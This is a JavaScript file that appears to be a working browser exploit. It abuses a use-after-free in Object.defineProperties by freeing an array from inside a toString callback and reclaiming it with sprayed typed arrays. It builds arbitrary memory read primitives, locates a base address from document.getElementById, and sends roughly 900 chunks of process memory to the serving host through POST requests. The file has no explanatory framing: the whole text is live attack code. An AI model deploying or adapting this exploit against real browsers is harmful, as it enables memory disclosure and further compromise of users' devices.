function send(ep, data) {
	data = JSON.stringify(data);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xhr.send('data=' + encodeURIComponent(data));
	} catch(e) {

	}
}
console = {
	log : function(msg) {
		if(onSwitch !== undefined)
			send('log', msg);
		else
			print('Log: ' + JSON.stringify(msg));
	}
};
var log = console.log;
if(onSwitch !== undefined) {
	window.onerror = function(msg, url, line) {
		send('error', [line, msg]);
		location.reload();
	};
}

function memdump(lo, hi, temp, size) {
	var data = new Array(size);
	for(var i = 0; i < size; ++i)
		data[i] = temp[i];
	send('memdump', [lo.toString(16), hi.toString(16), data]);
}

log('Loaded');

var rwbuf = new ArrayBuffer(0x1001 * 4);
var tu = new Uint32Array(rwbuf);
for(var i = 0; i < tu.length; ++i)
	tu[i] = ((i & 1) == 0) ? 0x41424344 : 0x41414141;

function pressureGC() {
	var pressure = new Array(4000);
	log('Pressurizing');
	for (var i = 0; i < pressure.length; i++) {
		pressure[i] = new Uint32Array(0x1000);
	}
	for (var i = 0; i < pressure.length; ++i)
		pressure[i] = 0;
}

var bufs;
function allocBuffers() {
	bufs = new Array(1500000);
	log('Making ' + bufs.length + ' buffers');
	for(var i = 0; i < bufs.length; ++i) {
		bufs[i] = new Uint32Array(rwbuf);
	}
}

function doExploit(buf, stale, temp) {
	function dump(name, buf, count) {
		for(var j = 0; j < count; ++j)
			log(name + '[' + j + '] == 0x' + buf[j].toString(16));
	}
	function dumpbuf(count) {
		dump('Buf', buf, count);
	}
	function dumptemp(count) {
		dump('Tem', temp, count);
	}

	function setStale(obj) {
		eval('(function(obj) { stale[eval("1 || ' + Math.random() + '")] = obj; log(stale[1].toString()[0]); })')(obj);
	}

	function setPtr(lo, hi, len) {
		setStale(temp);
		buf[4] = lo;
		buf[5] = hi;
		buf[6] = len;
	}

	function read4(lo, hi) {
		setPtr(lo, hi, 1);
		return stale[1][0];
	}

	function readAddr(obj) {
		setStale(obj);
		log('Obj memory:');
		dumpbuf(16);
		var addr = [buf[14], buf[15]];
		setStale(temp);
		log('Prev 0x' + addr[0].toString(16));
		log('Now 0x' + buf[4].toString(16));

		return addr;
	}

	/*log('Temp memory:')
	dumpbuf(16);
	var addr = readAddr(tu);
	log('Temp memory:')
	dumpbuf(16);
	log(read4(addr[0], addr[1]).toString(16));*/

	stale[1] = document.getElementById;
	dumpbuf(12);
	var lo = buf[6];
	var hi = buf[7];
	stale[1] = temp;
	buf[4] = lo;
	buf[5] = hi;
	buf[6] = 128;
	log('????????');

	lo = temp[6];
	hi = temp[7];
	buf[4] = lo;
	buf[5] = hi;
	dumptemp(16);
	log('!!!!!!!!!!!!');
	var lo = (temp[4] - 0x835e5c) >>> 0;
	if(temp[4] < 0x835e5c)
		hi = (temp[5] - 1) >>> 0;
	else
		hi = temp[5] >>> 0;
	
	var ctr = 0;
	for(var i = 0; i < 901; ++i) {
		buf[4] = lo;
		buf[5] = hi;
		buf[6] = 65536;
		memdump(lo, hi, temp, 65536 >> 4);

		if(temp[4] == 0x304F524E) {
			log('Beginning');
		}

		if(lo == 0xFFFF0000) {
			hi += 1;
			lo = 0;
		} else {
			lo = (lo + 0x10000) >>> 0;
		}
	}
}

function doItAll() {
	log('Starting');

	bufs = undefined;

	var arr = new Array(0x100);
	var yolo = new ArrayBuffer(0x1000);
	arr[0] = yolo;
	arr[1] = 0x13371337;

	var not_number = {};
	not_number.toString = function() {
		arr = null;
		props["stale"]["value"] = null;

		if(bufs === undefined) {
			//pressureGC();
			allocBuffers();
		}

		return 10;
	};

	var props = {
		p0 : { value : 0 },
		p1 : { value : 1 },
		p2 : { value : 2 },
		p3 : { value : 3 },
		p4 : { value : 4 },
		p5 : { value : 5 },
		p6 : { value : 6 },
		p7 : { value : 7 },
		p8 : { value : 8 },
		length : { value : not_number },
		stale : { value : arr },
		after : { value : 666 } 
	};

	var target = [];
	var stale = 0;
	var before_len = arr.length; 
	Object.defineProperties(target, props);
	stale = target.stale;

	log('Checking if triggered...');
	if(stale.length == before_len) {
		log('Failed to overwrite array');
		location.reload();
		return;
	}

	log('Triggered.  New length: 0x' + stale.length.toString(16));

	/*if(stale.length != 0x1001) {
		log('Bailing.');
		location.reload();
		return;
	}*/

	var temp = new Uint32Array(0x10);
	temp[0] = 0x41414141;
	stale[1] = temp;

	log('Looking for buf...');

	for(var i = 0; i < bufs.length; ++i) {
		if(bufs[i][0] != 0x41424344) {
			doExploit(bufs[i], stale, temp);
			break;
		}
	}

	log('Done');
}

